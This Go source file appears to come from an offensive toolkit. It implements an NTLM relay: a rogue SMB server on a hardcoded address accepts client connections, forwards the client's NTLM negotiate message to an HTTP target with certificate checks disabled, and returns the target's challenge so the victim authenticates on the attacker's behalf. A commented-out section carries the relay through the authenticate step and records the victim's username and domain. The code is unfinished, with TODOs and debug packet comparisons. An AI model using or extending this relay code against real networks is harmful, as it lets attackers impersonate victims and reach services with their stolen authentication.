package gopRelay

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"slices"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/hophouse/gop/authentication/ntlm"
	gopproxy "github.com/hophouse/gop/gopProxy"
	"github.com/hophouse/gop/utils/logger"
)

func RunSMBServer(serverAddr string, ProcessIncomingConnChan chan incomingConn) {
	serverAddr = "192.168.71.1:4445"
	serverAddrTCP4, err := net.ResolveTCPAddr("tcp", serverAddr)
	if err != nil {
		logger.Fatal(err)
	}

	logger.Printf("[+] Run SMB server on : %s\n", serverAddrTCP4.String())

	l, err := net.ListenTCP("tcp4", serverAddrTCP4)
	if err != nil {
		logger.Fatal(err)
	}
	defer l.Close()

	for {
		conn, err := l.AcceptTCP()
		if err != nil {
			logger.Println(err)
			break
		}
		defer conn.Close()

		ProcessIncomingConnChan <- incomingConn{
			f:    HandleSMBServer,
			conn: conn,
		}
	}
}

func HandleSMBServer(n *NTLMAuthHTTPRelay, conn *net.TCPConn, target string) error {
	n.ClientConnUUID = "SMB-" + n.ClientConnUUID

	err := conn.SetKeepAlive(true)
	if err != nil {
		logger.Println(err)
		return err
	}

	err = conn.SetKeepAlivePeriod(30 * time.Second)
	if err != nil {
		logger.Printf("Unable to set keepalive interval - %s", err)
	}

	err = n.ProcessSMBServer(target)
	if err != nil {
		logger.Printf("Error whil processing targets: %s\n", err)
		return err
	}

	return nil
}

func (n *NTLMAuthHTTPRelay) ProcessSMBServer(target string) error {
	n.mu.Lock()
	defer n.mu.Unlock()

	targetURLSanitized := strings.Replace(
		strings.Replace(
			strings.Replace(
				strings.Replace(target, "?", "", -1),
				"#", "", -1),
			":", "", -1),
		"/", "", -1)

	currentRelay := Relay{
		relayUUID:            "HTTP-" + strings.Split(uuid.NewString(), "-")[0],
		parentClientConnUUID: n.ClientConnUUID,
		target:               target,
		mu:                   &sync.Mutex{},
	}
	currentRelay.filename = fmt.Sprintf("%s-%s-%s-%s.html", time.Now().Format("20060102-150405"), n.ClientConnUUID, currentRelay.relayUUID, targetURLSanitized)

	// proxyURL, _ := url.Parse("http://127.0.0.1:8888")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		// Proxy:           http.ProxyURL(proxyURL),
	}
	currentRelay.conn = &http.Client{Transport: tr}

	for {

		buffer := make([]byte, 4096)
		size, err := n.clientConn.Read(buffer)
		if err != nil {
			logger.Fprintln(logger.Writer(), err)
			return err
		}

		netbiosSessionRequest := &NetBiosPacket{}
		err = netbiosSessionRequest.Read(buffer[0:4])
		if err != nil {
			err := fmt.Errorf("uknown packet length header %v", buffer[0:4])
			logger.Fprintln(logger.Writer(), err)
			return err
		}

		smbSessionRequest := buffer[4:size]
		if slices.Compare(smbSessionRequest[0:4], []byte("\xFFSMB")) == 0 {
			logger.Fprintln(logger.Writer(), "[+] SMB version is 1")
			smbHeader := &SMB1_REQUEST_HEADER{}
			smbHeader.Read(smbSessionRequest)

			logger.Println(smbHeader.ToString())

			switch smbHeader.Command {
			case SMB_COM_NEGOTIATE:
				sessionComNegotiate := &SMB1_NEGOTIATE_REQUEST{}
				sessionComNegotiate.Read(buffer[36:])

				logger.Println(sessionComNegotiate.ToString())

				// NETBIOS
				netBIOSResponse := &NetBiosPacket{
					MessageType: NETBIOS_SESSION_MESSAGE,
					Length:      make([]byte, 3),
				}

				// SMB
				// SMB2 Header
				smbHeader := &SMB2_HEADER_SYNC{
					ProtocolID:    []byte{0xFE, 'S', 'M', 'B'},
					StructureSize: 64,
					CreditCharge:  0,
					NT_STATUS:     0x00000000, // STATUS_SUCCESS
					Command:       SMB2_COM_NEGOTIATE,
					Credits:       1,
					Flags:         0x00000001, // This is a responnse
					NextCommand:   0x00000000,
					MessageID:     0x00000000,
					Reserved:      0x00000000,
					TreeID:        0x00000000,
					SessionID:     0x0000000000000000,
					Signature:     [16]byte{},
				}
				logger.Println(smbHeader.ToString())

				// SMB2 Negotiate Protcol Response
				sessionComNegotiateResponse := NewSMB2_NEGOTIATE_RESPONSE()
				logger.Println(sessionComNegotiateResponse.ToString())

				// Compute NetBIOS length
				netBIOSResponse.SetLength(uint32(smbHeader.StructureSize + sessionComNegotiateResponse.GetLength()))

				// respGood := []byte{0x0, 0x0, 0x0, 0xaa, 0xfe, 0x53, 0x4d, 0x42, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x3, 0x0, 0xff, 0x2, 0x0, 0x0, 0xd2, 0xbc, 0x1f, 0xa8, 0xda, 0x8d, 0x61, 0x43, 0x80, 0xd2, 0x4c, 0x85, 0x28, 0x24, 0xf5, 0x72, 0x7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x0, 0x0, 0x0, 0x80, 0x0, 0x0, 0x0, 0x80, 0x0, 0x8b, 0xe5, 0x9, 0x4c, 0x9, 0x82, 0xdb, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x0, 0x2a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x28, 0x6, 0x6, 0x2b, 0x6, 0x1, 0x5, 0x5, 0x2, 0xa0, 0x1e, 0x30, 0x1c, 0xa0, 0x1a, 0x30, 0x18, 0x6, 0xa, 0x2b, 0x6, 0x1, 0x4, 0x1, 0x82, 0x37, 0x2, 0x2, 0x1e, 0x6, 0xa, 0x2b, 0x6, 0x1, 0x4, 0x1, 0x82, 0x37, 0x2, 0x2, 0xa}

				resp := append(netBIOSResponse.ToBytes(), smbHeader.ToBytes()...)
				resp = append(resp, sessionComNegotiateResponse.ToBytes()...)

				// logger.Printf("Len good : %d\nLen other : %d\n", len(respGood), len(resp))

				// logger.Print("\tg\tb\n")
				// for i := 0; i < min(len(respGood), len(resp)); i++ {
				// 	logger.Printf("%d\t%x\t%x\n", i, respGood[i], resp[i])
				// }
				// logger.Print("\n\n")

				_, err = n.clientConn.Write(resp)
				if err != nil {
					logger.Fprintln(logger.Writer(), err)
					return err
				}

				continue
			default:
				logger.Printf("SMB header commande \"%s\" is not implemented", SMB_COMMAND_NAMES[smbHeader.Command])
				continue
			}

		} else if slices.Compare(smbSessionRequest[0:4], []byte("\xFESMB")) == 0 {
			logger.Fprintln(logger.Writer(), "[+] SMB version is 2/3")
			smbHeader := &SMB2_HEADER_SYNC{}
			smbHeader.Read(smbSessionRequest)

			logger.Println(smbHeader.ToString())

			switch smbHeader.Command {
			case SMB2_COM_NEGOTIATE:
				//
				// Read packet
				//

				sessionComNegotiate := &SMB2_NEGOTIATE_REQUEST{}
				err := sessionComNegotiate.Read(buffer[smbHeader.StructureSize:])
				if err != nil {
					logger.Fprintln(logger.Writer(), err)
					return err
				}

				logger.Println(sessionComNegotiate.ToString())

				//
				// Write packet
				//

				// NETBIOS
				netBIOSResponse := &NetBiosPacket{
					MessageType: NETBIOS_SESSION_MESSAGE,
					Length:      make([]byte, 3),
				}

				// SMB
				// SMB2 Header
				smbHeader := &SMB2_HEADER_SYNC{
					ProtocolID:    []byte{0xFE, 'S', 'M', 'B'},
					StructureSize: 64,
					CreditCharge:  0,
					NT_STATUS:     0x00000000, // STATUS_SUCCESS
					Command:       SMB2_COM_NEGOTIATE,
					Credits:       1,
					Flags:         0x00000001, // This is a responnse
					NextCommand:   0x00000000,
					MessageID:     0x00000000,
					Reserved:      0x00000000,
					TreeID:        0x00000000,
					SessionID:     0x0100000000340000,
					Signature:     [16]byte{},
				}
				logger.Println(smbHeader.ToString())

				// SMB2 Negotiate Protcol Response
				sessionComNegotiateResponse := NewSMB2_NEGOTIATE_RESPONSE()
				logger.Println(sessionComNegotiateResponse.ToString())

				// Compute NetBIOS length
				netBIOSResponse.SetLength(uint32(smbHeader.StructureSize + sessionComNegotiateResponse.GetLength()))

				// TODO
				resp := append(netBIOSResponse.ToBytes(), smbHeader.ToBytes()...)
				resp = append(resp, sessionComNegotiateResponse.ToBytes()...)

				respGood := []byte{0x0, 0x0, 0x1, 0x2c, 0xfe, 0x53, 0x4d, 0x42, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xfe, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x1, 0x0, 0x11, 0x3, 0x5, 0x0, 0xba, 0x40, 0xab, 0x11, 0x57, 0xe0, 0x4e, 0x47, 0xb0, 0xc8, 0x44, 0xaa, 0x75, 0x3a, 0x74, 0xa0, 0xaf, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x0, 0x0, 0x0, 0x80, 0x0, 0x0, 0x0, 0x80, 0x0, 0x57, 0x40, 0x7e, 0xff, 0xce, 0x82, 0xdb, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x0, 0x2a, 0x0, 0xb0, 0x0, 0x0, 0x0, 0x60, 0x28, 0x6, 0x6, 0x2b, 0x6, 0x1, 0x5, 0x5, 0x2, 0xa0, 0x1e, 0x30, 0x1c, 0xa0, 0x1a, 0x30, 0x18, 0x6, 0xa, 0x2b, 0x6, 0x1, 0x4, 0x1, 0x82, 0x37, 0x2, 0x2, 0x1e, 0x6, 0xa, 0x2b, 0x6, 0x1, 0x4, 0x1, 0x82, 0x37, 0x2, 0x2, 0xa, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x26, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x20, 0x0, 0x1, 0x0, 0x63, 0xb2, 0x67, 0xce, 0xa0, 0x7a, 0xdf, 0x89, 0x83, 0x2d, 0x8, 0x80, 0xa6, 0x4a, 0x53, 0xa, 0x88, 0x1b, 0xd4, 0x28, 0xd9, 0x1f, 0xed, 0x20, 0x23, 0x2d, 0xa5, 0x4d, 0x2f, 0xd0, 0x31, 0x88, 0x0, 0x0, 0x2, 0x0, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x0, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7, 0x0, 0xc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3, 0x0, 0xc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x4, 0x0}

				_, compareStr := CompareBytesSlices(respGood, resp)
				logger.Print(compareStr)

				// TODO
				_, err = n.clientConn.Write(resp)
				if err != nil {
					logger.Println(err)
					return err
				}

				continue
			case SMB2_COM_SESSION_SETUP:
				//
				// Read packet
				//

				sessionComSessionSetupRequest := &SMB2_COM_SESSION_SETUP_REQUEST{}
				// TODO Look why adding 4 bytes was the solution
				err := sessionComSessionSetupRequest.Read(buffer[smbHeader.StructureSize+4:])
				if err != nil {
					logger.Fprintln(logger.Writer(), err)
					return err
				}

				logger.Println(sessionComSessionSetupRequest.ToString())

				//
				// Decode the NTLM SSP Negotiate packet
				//

				ntlmNegotiateRequest_bytes := sessionComSessionSetupRequest.Buffer[34:]
				serverNegotiateRequest := ntlm.NTLMSSP_NEGOTIATE{}
				serverNegotiateRequest.Read(ntlmNegotiateRequest_bytes)

				logger.Printf("%s | %s | client :: gop | [+] NTLM NEGOTIATE\n", n.ClientConnUUID, currentRelay.relayUUID)
				for _, line := range strings.Split(serverNegotiateRequest.ToString(), "\n") {
					logger.Printf("%s | %s | client :: gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
				}

				/*
				 *
				 * Client part
				 *
				 */
				clientChallBytes := []byte{}

				clientNTLMSSPChallengeResponse, err := func(buf *[]byte) (*ntlm.NTLMSSP_CHALLENGE, error) {

					clientInitialRequest, err := http.NewRequest(http.MethodGet, target, nil)
					if err != nil {
						logger.Println(err)
						return nil, err
					}

					clientInitialResponse, err := currentRelay.SendRequestGetResponse(clientInitialRequest, "gop", "target")
					if err != nil {
						logger.Println(err)
						return nil, err
					}

					if _, exist := clientInitialResponse.Header["Www-Authenticate"]; !exist {
						err := fmt.Errorf("no authorization header present on the client")
						logger.Println(err)
						return nil, err

					}

					clientNegotiateRequest := gopproxy.CopyRequest(clientInitialRequest)
					clientNegotiateRequest.URL, err = url.Parse(currentRelay.target)
					if err != nil {
						logger.Println(err)
						return nil, err
					}
					clientNegotiateRequest.Header.Add("Authorization", fmt.Sprintf("NTLM %s", base64.StdEncoding.EncodeToString(ntlmNegotiateRequest_bytes)))

					clientNegotiateResponse, err := currentRelay.SendRequestGetResponse(clientNegotiateRequest, "gop", "target")
					if err != nil {
						logger.Println(err)
						return nil, err
					}

					authorization := clientNegotiateResponse.Header.Get("Www-Authenticate")

					if clientNegotiateResponse.StatusCode != 401 {
						err := fmt.Errorf("client respond with a %s code", clientNegotiateResponse.Status)
						logger.Printf("%s | %s | Error       : %s\n", n.ClientConnUUID, currentRelay.relayUUID, err)
						currentRelay.conn.CloseIdleConnections()
						return nil, err
					}

					authorization_bytes, err := base64.StdEncoding.DecodeString(authorization[5:])
					if err != nil {
						err := fmt.Errorf("decode error authorization header : %s", authorization)
						return nil, err
					}
					logger.Printf("\n\n[+]Authorization bytes:\n %x\n\n", authorization_bytes)

					clientChallengeNTLM := ntlm.NTLMSSP_CHALLENGE{}
					clientChallengeNTLM.Read(authorization_bytes)

					logger.Fprintf(logger.Writer(), "%s | %s | gop :: target | [+] Client Challenge\n", n.ClientConnUUID, currentRelay.relayUUID)
					for _, line := range strings.Split(clientChallengeNTLM.ToString(), "\n") {
						fmt.Printf("%s | %s | gop :: target | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
					}

					clientChallBytes, err = binary.Append(clientChallBytes, binary.LittleEndian, authorization_bytes)
					if err != nil {
						return nil, err
					}

					return &clientChallengeNTLM, nil

				}(&clientChallBytes)

				if err != nil {
					logger.Println(err)
					return err
				}
				logger.Println(clientChallBytes)
				/*
				 *
				 * End client part
				 *
				 */

				//
				// Write packet
				//

				// NETBIOS
				netBIOSResponse := &NetBiosPacket{
					MessageType: NETBIOS_SESSION_MESSAGE,
					Length:      make([]byte, 3),
				}

				// SMB
				// SMB2 Header
				smbHeader := &SMB2_HEADER_SYNC{
					ProtocolID:    []byte{0xFE, 'S', 'M', 'B'},
					StructureSize: 64,
					CreditCharge:  1,
					NT_STATUS:     binary.LittleEndian.Uint32([]byte{0x16, 0x0, 0x0, 0xc0}), // STATUS_MORE_PROCESSING_REQUIRED
					Command:       SMB2_COM_SESSION_SETUP,
					Credits:       1,
					Flags:         0x00000011, // This is a responnse, Priority
					NextCommand:   0x00000000,
					MessageID:     0x00000001,
					Reserved:      0x0000feff,
					TreeID:        0x00000000,
					SessionID:     0x0900000000300000,
					Signature:     [16]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
				}

				// Create security buffer :
				logger.Print("\n[+] Client NTLMSSP Session Setup Response :\n")
				logger.Print(clientNTLMSSPChallengeResponse.ToString())

				// SMB2 Session Setup Response created with the client NTLMSSP Challenge response
				sessionComSessionSetupResponse := NewSMB2_COM_SESSION_SETUP_RESPONSE(clientNTLMSSPChallengeResponse.ToBytes(), smbHeader.StructureSize)
				logger.Printf("%#v\n", sessionComSessionSetupResponse)
				logger.Printf("%x\n", sessionComSessionSetupResponse.ToBytes())
				logger.Println(sessionComSessionSetupResponse.ToString())

				// Compute NetBIOS length
				netBIOSResponse.SetLength(uint32(smbHeader.StructureSize + sessionComSessionSetupResponse.GetLength()))

				logger.Println(netBIOSResponse.ToString())
				logger.Println(smbHeader.ToString())
				logger.Println(sessionComSessionSetupResponse.ToString())

				// TODO
				resp := []byte{}
				resp = append(resp, netBIOSResponse.ToBytes()...)
				resp = append(resp, smbHeader.ToBytes()...)
				resp = append(resp, sessionComSessionSetupResponse.ToBytes()...)

				logger.Printf("response\n\n\n%x\n", resp)
				_, err = n.clientConn.Write(resp)
				if err != nil {
					logger.Println(err)
					return err
				}

				continue

			default:
				logger.Printf("SMB2 header commande \"%s\" is not implemented", SMB2_COMMAND_NAMES[smbHeader.Command])
				continue
			}
		} else {
			err := fmt.Errorf("unknown SMB version %x requested by the client", buffer[0:4])
			logger.Fprintln(logger.Writer(), err)
			return err
		}

		continue

		break

		// clientRequest, err := http.ReadRequest(n.Reader)
		// if err != nil {
		// 	logger.Fprintln(logger.Writer(), err)
		// 	return err
		// }

		// clientRequestDump, err := httputil.DumpRequest(clientRequest, true)
		// if err != nil {
		// 	logger.Fprintln(logger.Writer(), err)
		// 	return err
		// }
		// io.Copy(io.Discard, clientRequest.Body)
		// clientRequest.Body.Close()

		// for _, line := range strings.Split(string(clientRequestDump), "\n") {
		// 	logger.Fprintf(logger.Writer(), "%s | client -> gop | %s\n", n.ClientConnUUID, line)
		// }
		// logger.Fprint(logger.Writer(), "\n")

		// clientAuthorizationHeader := clientRequest.Header.Get("Authorization")

		// // Send WWW-Authenticate: NTLM header if not present
		// if clientAuthorizationHeader == "" {
		// 	// TCP Connexion will be closed by the client and a new TCP connexion will be received
		// 	n.step = "Authentication"
		// 	err := n.initiateWWWAuthenticate()
		// 	if err != nil {
		// 		logger.Fprintln(logger.Writer(), err)
		// 		return err
		// 	}
		// 	return nil
		// }

		// clientAuthorization := clientRequest.Header.Get("Authorization")

		// authorization_bytes, err := base64.StdEncoding.DecodeString(clientAuthorization[5:])
		// if err != nil {
		// 	err := fmt.Errorf("decode error authorization header : %s", clientAuthorization)
		// 	logger.Panicln(err)
		// 	continue
		// 	// return err
		// }
		// msgType := binary.LittleEndian.Uint32(authorization_bytes[8:12])

		// logger.Fprintf(logger.Writer(), "%s | %s | [+] Message type : %d\n", n.ClientConnUUID, currentRelay.relayUUID, msgType)

		// /*
		//  * Message Type 1
		//  */

		// // Received Negociate message. Handle it and answer with a Challenge message

		// if msgType == uint32(1) {
		// 	// Client Negotiate
		// 	serverNegociateRequest := ntlm.NTLMSSP_NEGOTIATE{}
		// 	serverNegociateRequest.Read(authorization_bytes)

		// 	logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | [+] NTLM NEGOTIATE\n", n.ClientConnUUID, currentRelay.relayUUID)
		// 	for _, line := range strings.Split(serverNegociateRequest.ToString(), "\n") {
		// 		logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
		// 	}

		// 	/*
		// 	 *
		// 	 * Client part
		// 	 *
		// 	 */

		// 	clientNegotiateRequest := gopproxy.CopyRequest(clientRequest)
		// 	clientNegotiateRequest.URL, err = url.Parse(currentRelay.target)
		// 	if err != nil {
		// 		logger.Println(err)
		// 		return err
		// 	}

		// 	logger.Println(clientNegotiateRequest)
		// 	logger.Printf("%#v\n", &clientNegotiateRequest)

		// 	clientNegotiateResponse, err := currentRelay.SendRequestGetResponse(clientNegotiateRequest, "gop", "target")
		// 	if err != nil {
		// 		logger.Println(err)
		// 		return err
		// 	}

		// 	authorization := clientNegotiateResponse.Header.Get("Www-Authenticate")

		// 	if clientNegotiateResponse.StatusCode != 401 {
		// 		err := fmt.Errorf("client respond with a %s code", clientNegotiateResponse.Status)
		// 		logger.Fprintf(logger.Writer(), "%s | %s | Error       : %s\n", n.ClientConnUUID, currentRelay.relayUUID, err)
		// 		currentRelay.conn.CloseIdleConnections()
		// 		return err
		// 	}

		// 	authorization_bytes, err = base64.StdEncoding.DecodeString(authorization[5:])
		// 	if err != nil {
		// 		err := fmt.Errorf("decode error authorization header : %s", authorization)
		// 		return err
		// 	}

		// 	clientChallengeNTLM := ntlm.NTLMSSP_CHALLENGE{}
		// 	clientChallengeNTLM.Read(authorization_bytes)

		// 	logger.Fprintf(logger.Writer(), "%s | %s | gop :: target | [+] Client Challenge\n", n.ClientConnUUID, currentRelay.relayUUID)
		// 	for _, line := range strings.Split(clientChallengeNTLM.ToString(), "\n") {
		// 		fmt.Fprintf(logger.Writer(), "%s | %s | gop :: target | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
		// 	}

		// 	/*
		// 	 *
		// 	 * End client part
		// 	 *
		// 	 */
		// 	clientNegotiateResponseDump, err := httputil.DumpResponse(clientNegotiateResponse, true)
		// 	if err != nil {
		// 		logger.Println(err)
		// 		continue
		// 		// return err
		// 	}

		// 	n.clientConn.Write(clientNegotiateResponseDump)
		// 	for _, line := range strings.Split(string(clientNegotiateResponseDump), "\n") {
		// 		logger.Fprintf(logger.Writer(), "%s | %s | client <- gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
		// 	}

		// 	logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | [+] Sent server challenge to client\n", n.ClientConnUUID, currentRelay.relayUUID)

		// 	continue
		// }

		// /*
		//  * End Message Type 1
		//  */

		// // Retrieve information into the Authentication message
		// /*
		//  * Message Type 3
		//  */
		// if msgType == uint32(3) {
		// 	logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | [+] Server received Authenticate\n", n.ClientConnUUID, currentRelay.relayUUID)

		// 	serverAuthenticate := ntlm.NTLMSSP_AUTH{}
		// 	serverAuthenticate.Read(authorization_bytes)

		// 	currentRelay.Domain = string(serverAuthenticate.TargetName.Payload)
		// 	currentRelay.Username = string(serverAuthenticate.Username.Payload)
		// 	currentRelay.Workstation = string(serverAuthenticate.Workstation.Payload)

		// 	logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | [+] Server authenticate\n", n.ClientConnUUID, currentRelay.relayUUID)
		// 	for _, line := range strings.Split(serverAuthenticate.ToString(), "\n") {
		// 		logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
		// 	}

		// 	// Prepare final response to the client
		// 	ntlmv2Response := ntlm.NTLMv2Response{}
		// 	ntlmv2Response.Read(serverAuthenticate.NTLMv2Response.Payload)

		// 	fmt.Fprintf(logger.Writer(), "%s | %s | client :: gop | [+] NTLM AUTHENTICATE RESPONSE:\n", n.ClientConnUUID, currentRelay.relayUUID)
		// 	for _, line := range strings.Split(string(ntlmv2Response.ToString()), "\n") {
		// 		fmt.Fprintf(logger.Writer(), "%s | %s | client :: gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
		// 	}

		// 	/*
		// 	 *
		// 	 * Client part
		// 	 *
		// 	 */
		// 	clientAuthRequest, _ := http.NewRequest("GET", target, nil)
		// 	gopproxy.CopyHeader(clientAuthRequest.Header, clientRequest.Header)
		// 	clientAuthResponse, err := currentRelay.SendRequestGetResponse(clientAuthRequest, "gop", "target")
		// 	if err != nil {
		// 		logger.Println(err)
		// 		continue
		// 		// return err
		// 	}

		// 	if clientAuthResponse.StatusCode == 401 {
		// 		return fmt.Errorf("could not authenticate to the endpoint")
		// 	}

		// 	currentRelay.AuthorizationHeader = clientRequest.Header.Get("Authorization")

		// 	/*
		// 	 *
		// 	 * End client part
		// 	 *
		// 	 */

		// 	randomPath := uuid.NewString()
		// 	clientInitialResponseByte := []byte(
		// 		"HTTP/1.1 307 Temporary Redirect\n" +
		// 			"Location: /" + randomPath + " \n" +
		// 			// "WWW-Authenticate: NTLM\n" +
		// 			// "WWW-Authenticate: Negociate\n" +
		// 			"Connection: keep-alive\n" +
		// 			"Content-Length: 0\n" +
		// 			"\n\n")

		// 	// clientInitialResponseByte := []byte(
		// 	// 	"HTTP/1.1 200 OK\n" +
		// 	// 		"WWW-Authenticate: NTLM\n" +
		// 	// 		"WWW-Authenticate: Negociate\n" +
		// 	// 		"Connection: keep-alive\n" +
		// 	// 		"Keep-Alive: timeout=8888888888888888, max=88888888" +
		// 	// 		"Content-Length: 0\n" +
		// 	// 		"\n\n\n")

		// 	n.clientConn.Write(clientInitialResponseByte)
		// 	for _, line := range strings.Split(string(clientInitialResponseByte), "\n") {
		// 		fmt.Fprintf(logger.Writer(), "%s | %s | client <- gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
		// 	}
		// 	logger.Fprint(logger.Writer(), "\n")

		// 	// clientWWWAuthenticateResponseByte := []byte(
		// 	// 	"HTTP/1.1 401 Unauthorized\n" +
		// 	// 		"WWW-Authenticate: NTLM\n" +
		// 	// 		"WWW-Authenticate: Negociate\n" +
		// 	// 		"Connection: keep-alive\n" +
		// 	// 		"Keep-Alive: timeout=8888888888888888, max=88888888" +
		// 	// 		"Content-Length: 0\n" +
		// 	// 		"\n\n\n")

		// 	break
		// }
		// /*
		//  * End Message Type 3
		//  */

	}

	n.Relays[currentRelay.target] = &currentRelay

	return nil
}
